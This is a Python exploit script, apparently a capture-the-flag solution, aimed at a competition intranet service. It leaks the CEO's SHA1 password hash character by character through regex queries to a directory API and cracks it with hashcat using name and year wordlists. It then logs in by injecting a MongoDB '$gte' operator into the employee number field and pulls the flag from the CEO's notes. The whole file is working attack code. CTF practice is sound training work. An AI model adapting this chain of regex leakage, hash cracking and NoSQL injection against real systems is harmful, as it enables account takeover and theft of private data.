#!/usr/bin/env python3
# /// script
# dependencies = [
#   "Faker~=37.1",
#   "requests~=2.32",
# ]
# ///
import re
import requests
import itertools
import subprocess
import tempfile

import faker.providers.person.en_US as en_person

ENDPOINT = "https://intranet9000.finals.scc2025.ctf.rs/"

# Find SHA1 password hash by leaking it using the regex

print("Leaking SHA1 password hash using regex...")
HASH_LENGTH = 40
known_hash = ""
for position in range(0, HASH_LENGTH):
    for char in itertools.chain(range(ord('0'), ord('9')+1), range(ord('a'), ord('f')+1)):
        test_hash = "^" + known_hash + chr(char) + ".*"
        query_params = {
            "department": "CEO",
            "password": test_hash,
        }
        response = requests.get(ENDPOINT + "/api/directory", params=query_params)
        response.raise_for_status()
        data = response.json().get("items", [])
        if len(data) > 0:
            known_hash += chr(char)
            #print(known_hash)
            break
    else:
        print(f"Failed to find character at position {position}")
        exit(1)

print(f"Leaked SHA1 password hash: {known_hash}")

# Crack the password using a dictionary attack

print("Cracking password using dictionary attack...")

def crack_combination(files):
    cmd = "combinator3 " + " ".join(files) + " | hashcat -O --potfile-path=my.pot -d 3 -a 0 -m 100 hash.txt"
    print("Running command: ", cmd)
    proc = subprocess.Popen(cmd, shell=True, cwd=temp_dir)
    proc.wait()
    return proc.returncode == 0

with tempfile.TemporaryDirectory() as temp_dir:
    with open(temp_dir + "/first_names.txt", "w") as dictionary_file:
        dictionary_file.write("\n".join(en_person.Provider.first_names))

    with open(temp_dir + "/last_names.txt", "w") as dictionary_file:
        dictionary_file.write("\n".join(en_person.Provider.last_names))

    with open(temp_dir + "/years.txt", "w") as dictionary_file:
        for year in range(1950, 2000):
            dictionary_file.write(f"{year}\n")
    
    with open(temp_dir + "/hash.txt", "w") as dictionary_file:
        dictionary_file.write(known_hash + "\n")

    # Crack using hashcat
    for order in itertools.permutations(["years.txt", "first_names.txt", "last_names.txt"]):
        print("Cracking with order:", " ".join(order))
        if crack_combination(order):
            break

    with open(temp_dir + "/my.pot", "r") as pot_file:
        pot = pot_file.read().strip()
    
    if pot:
        cracked_password = pot.split(":")[1]
        print(f"Cracked password: {cracked_password}")
    else:
        print("Failed to crack the password")
        exit(1)

# Login as CEO, abusing the MongoDB injection vulnerability

resp = requests.post(ENDPOINT + "/api/login", json={
    "employee_number": {
        "$gte": 0,
    },
    "password": cracked_password,
})
resp.raise_for_status()
resp_data = resp.json()

print(resp_data)

# Get the CEO's notes

resp = requests.get(ENDPOINT + "/api/notes", params={
    "department": "CEO",
}, headers={
    "Authorization": f"Bearer {resp_data['session_token']}",
})
resp.raise_for_status()


# Print the flag from the notes

flag_pattern = r"[\w_-]+{.*?}"
flag = re.search(flag_pattern, resp.text)
if flag:
    print(f"Flag: {flag.group()}")
else:
    print("No flag found in the notes")
    exit(1)
